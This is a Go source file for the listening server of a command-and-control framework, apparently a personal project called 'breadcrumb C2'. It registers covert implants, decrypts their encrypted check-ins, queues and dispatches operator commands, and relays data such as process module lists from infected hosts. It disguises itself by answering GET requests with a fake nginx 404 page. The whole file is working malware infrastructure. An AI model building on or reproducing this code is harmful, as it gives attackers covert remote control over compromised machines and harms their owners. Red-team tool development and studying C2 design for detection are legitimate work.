/*
	The bread loaf is the server of the breadcrumb C2. The load will have implants named 'slices'. Each user will be a
	crumb
*/

package ListeningServer

import (
	"AllSecure/ListeningServer/Common"
	"AllSecure/TeamServer/Crypt"
	"context"
	"github.com/gin-gonic/gin"
	"io"
	"log"
	"net/http"
	"os"
	"strconv"
	"time"
)

type LS struct {
	Listener Common.ListeningServer
}

var (
	agent_map   map[string]*Common.Implant //EACH AGENT HAS THEIR OWN CMD QUEUE
	g_clientobj Common.Client
)

func ProcessRequest(c *gin.Context) {
	var (
		decryptedPayload []byte
		AESKey           []byte
		IV               []byte
		data_package     Common.Package
	)
	body, err := io.ReadAll(c.Request.Body)
	if err != nil {
		panic(err)
	}
	defer c.Request.Body.Close()

	err = data_package.UnmarshalHeader(body)
	if err != nil && err.Error() != "[error] insufficient data for package unmarshalling" {
		log.Println("[error] attempting to unmarshal header", err)
		c.JSON(http.StatusInternalServerError, "Internal Server Error")
	}

	switch data_package.CmdID {
	case Common.CMD_Register:
		var (
			NewImplant *Common.Implant
			Registered bool
		)
		err = data_package.UnmarshalEncryptedMetaData(body)
		if err != nil && err.Error() != "[error] insufficient data for package unmarshalling" {
			log.Println("[error] attempting to unmarshal header", err)
			c.JSON(http.StatusInternalServerError, "Internal Server Error")

		}

		decryptedPayload, AESKey, IV, err = Crypt.AESDecryptPayload(data_package, "C:\\Users\\Brendan Ortiz\\Documents\\GOProjcets\\AllSecure\\")
		if err != nil {
			log.Println("[error] attempting to decrypt payload")
			c.JSON(http.StatusInternalServerError, "Internal Server Error")
		}

		//check if implant is already registered
		if len(agent_map) > 0 {
			agent := agent_map[data_package.AgentName]
			if agent != nil && agent.AESKey != nil && agent.IV != nil { // this will ensure we don't attempt to compare nil slices from a newly registering implant
				if Common.CheckIfKeyIVIsEqual(agent.AESKey, agent.IV, AESKey, IV) {
					log.Println("[info] implant already registered")
					c.JSON(http.StatusOK, "")
					Registered = true // if we're already registered, we don't need to do anything else
				}
			}
		}

		if Registered {
			break // break out of switch. We're already registered
		} else { // if we're not registered, we need to register

			NewImplant = &Common.Implant{
				AESKey:  AESKey,
				IV:      IV,
				Alive:   true,
				Context: Common.ImplantContext{},
				CmdQue:  Common.Queue{},
			}
			//set the agent name before we add it to our array b/c it's part of the header package and not dedcrypted data.
			NewImplant.Context.Agent_name = data_package.AgentName
			NewImplant.Context.LastCheckin = time.Now()

			//add the agent to the agent map
			agent_map[data_package.AgentName] = NewImplant

			go func() {
				err = RegisterAgent(NewImplant, decryptedPayload)
				if err != nil {
					log.Println("[error] attempting to initialize agent", err)
				}
			}()
			break //CMD_Register
		}

	case Common.CMD_GET_JOB:
		var (
			AgentCmd Common.AgentCmd
			agent    *Common.Implant
		)

		if len(agent_map) == 0 { // we have a nil map yet we're trying to get a job need to register.
			// we would hit this when the listening server comes up AFTER the implant is running / reaching out already.

			AgentCmd.CmdID = Common.CMD_Register
			AgentCmd.RequestID = data_package.RequestID + 1
			AgentCmd.DataBuffer = nil

			agent = &Common.Implant{
				AESKey:  nil,
				IV:      nil,
				Alive:   true,
				Context: Common.ImplantContext{},
				CmdQue:  Common.Queue{},
			}
			agent.CmdQue.PreemptQueue(AgentCmd)
			agent.Context.Agent_name = data_package.AgentName
			agent.Context.LastCheckin = time.Now()
			agent_map[data_package.AgentName] = agent // create a temporary agent to hold the command
		}

		//parse data
		err = data_package.UnmarshalEncryptedData(body)
		if err != nil {
			if err.Error() != "[error] insufficient data for package unmarshalling" {
				log.Println("[error] attempting to unmarshal header", err)
				c.JSON(http.StatusInternalServerError, "Internal Server Error")
			}
		}

		if agent_map[data_package.AgentName].AESKey != nil && agent_map[data_package.AgentName].IV != nil {
			//TODO DO SOMETHING WITH DECRYPTED DATA

			decryptedPayload = Crypt.AES256CTR(data_package.EncryptedData, agent_map[data_package.AgentName].AESKey, agent_map[data_package.AgentName].IV)
			ParseDataPackage(decryptedPayload, data_package.AgentName)
		}

		agent = agent_map[data_package.AgentName]
		if agent.CmdQue.Len() == 0 {
			AgentCmd.CmdID = Common.CMD_NO_JOB
			AgentCmd.RequestID = data_package.RequestID + 1
			c.Data(http.StatusOK, "application/octet-stream", AgentCmd.MarshalAgentCmd())
			agent.Context.LastCheckin = time.Now()

		} else if agent.CmdQue.Len() > 0 {
			var (
				value interface{}
				ok    bool
			)
			agent.Context.LastCheckin = time.Now()
			value, err = agent.CmdQue.Dequeue()

			if err != nil {
				log.Println("[error] attempting to dequeue agent command", err)
				c.Data(http.StatusInternalServerError, "application/octet-stream", nil)
			}
			//TODO if there is multiple commands in the queue, we need to send them all
			if AgentCmd, ok = value.(Common.AgentCmd); ok {
				c.Data(http.StatusOK, "application/octet-stream", AgentCmd.MarshalAgentCmd())
			} else {
				log.Println("[error] attempting to cast value to AgentCmd")
				c.Data(http.StatusInternalServerError, "application/octet-stream", nil)
			}
		}

		SendEvent("UpdateCheckin", agent.Context, agent.Alive, nil) // update our last checkin no matter if we have a job to do or not.
		break                                                       // CMD_GET_JOB

	default:
		break
	} //switch

}

func DenyRequest(c *gin.Context) {
	c.Writer.WriteHeader(http.StatusNotFound)
	html, err := os.ReadFile("C:\\Users\\Brendan Ortiz\\Documents\\GOProjcets\\AllSecure\\ListeningServer\\Assets\\NotFound.html")
	if err != nil {
		log.Println("Could not load not found html file", err)
		c.JSON(http.StatusInternalServerError, "Internal Server Error")
	}
	c.Header("Server", "nginx")
	c.Header("Content-Type", "text/html")
	c.Writer.Write(html)
}

func (ls *LS) Start(token string) error {

	agent_map = make(map[string]*Common.Implant)

	go func() {
		err := StartEventHandler(token, ls.Listener.TS.Address+":"+ls.Listener.TS.Port)
		if err != nil {
			log.Println("[error] attempting to start event handler", err)
			return
		}
	}()

	go func() {
		for {
			if len(agent_map) > 0 {
				for name, agent := range agent_map {
					if !Common.CheckIfAgentIsAlive(agent) {
						//TODO remove agent from agent_map & send event to client.
						SendEvent("UpdateHealth", agent.Context, agent.Alive, nil)
						log.Println("[info] removing agent [", name, "] from agent array")

						// do we even have to send the event to the client? The client should be able to determine if the agent is alive or not.
						// also if client does not have connectivity, it will not be able to receive the event.
						/*
							Cmd := Common.AgentCmd{
								CmdID:      Common.CMD_UPDATE_HEALTH,
								RequestID:  0,
								DataBuffer: nil,
							}

							agent.CmdQue.Enqueue(Cmd)
						*/
					}
				}
			}
			time.Sleep(5 * time.Second)
		}
	}()

	var err error
	ls.Listener.GinEngine.POST("/*endpoint", ProcessRequest)
	ls.Listener.GinEngine.GET("/*endpoint", DenyRequest)

	if ls.Listener.Config.Secure == true {

		err = os.WriteFile(ls.Listener.TLS.CertPath, ls.Listener.TLS.Cert, 0644)
		if err != nil {
			log.Fatalln("[error] Failed to save certificate", err)
		}
		err = os.WriteFile(ls.Listener.TLS.KeyPath, ls.Listener.TLS.Key, 0644)
		if err != nil {
			log.Fatalln("[error] Failed to save key path", err)
		}

		if err = ls.Listener.GinEngine.RunTLS(ls.Listener.Config.Address+":"+strconv.Itoa(ls.Listener.Config.Port),
			ls.Listener.TLS.CertPath, ls.Listener.TLS.KeyPath); err != nil {
			log.Fatalln("[error] failed to start websocket: ", err)
		}

	} else {
		err = ls.Listener.HttpServer.ListenAndServe()
		if err != nil {
			log.Println("[error] attempting to launch listening server", err)
			return err
		}
	}

	return nil
}

func (ls *LS) Stop() bool {
	var err error
	ctx, cancel := context.WithTimeout(context.Background(), 0)
	defer cancel()
	if ls.Listener.HttpServer.Close(); err != nil {
		log.Println("[error] attempting to close connections")
		return false
	}
	if err = ls.Listener.HttpServer.Shutdown(ctx); err != nil {
		log.Println("[error] server shutdown failed: ", err)
		return false
	}
	if err = os.Remove(ls.Listener.TLS.CertPath); err != nil {
		log.Println("[error] attempting to delete the server certificate file", err)
	}

	err = os.Remove(ls.Listener.TLS.KeyPath)
	if err != nil {
		log.Println("[error] attempting to delete the server key file", err)
	}
	return true

}

func ParseDataPackage(decryptedPayload []byte, AgentName string) {
	var (
		DataPackage Common.DataPackage
		err         error
	)

	err = DataPackage.UnmarshalData(decryptedPayload)
	if err != nil {
		if err.Error() == "insufficient data for package unmarshalling" {
			return
		}
		log.Println("[error] attempting to unmarshal data package", err)
		return
	}

	switch DataPackage.DataType {
	case Common.CMD_LIST_MODULES:
		var ProcID uint32
		ProcID = DataPackage.ReadInt32()
		log.Println("Received command to list modules from agent", AgentName, "with process ID", ProcID)
		Modules := make(map[string][]byte)
		for DataPackage.DataSize > 0 {
			Modules[DataPackage.ReadString()] = DataPackage.ReadPointer()
		}
		err = SendEvent("SendModuleData", agent_map[AgentName].Context, agent_map[AgentName].Alive, Modules)
		if err != nil {
			log.Println("[error] attempting to send module data to client", err)
		}

		if len(DataPackage.Data) > 0 {
			ParseDataPackage(DataPackage.Data, AgentName)
		}
		break
	default:
		break
	}
}
